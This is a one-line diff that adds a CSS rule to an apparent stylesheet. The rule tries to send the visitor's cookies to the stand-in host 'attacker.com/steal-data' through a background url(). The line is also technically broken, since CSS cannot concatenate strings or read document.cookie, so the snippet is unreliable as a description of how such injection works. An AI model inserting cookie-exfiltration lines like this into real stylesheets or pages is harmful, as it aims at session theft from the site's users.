@@ -1,0 +1,1 @@
+body { background: url('http://attacker.com/steal-data?cookie=' + document.cookie); }
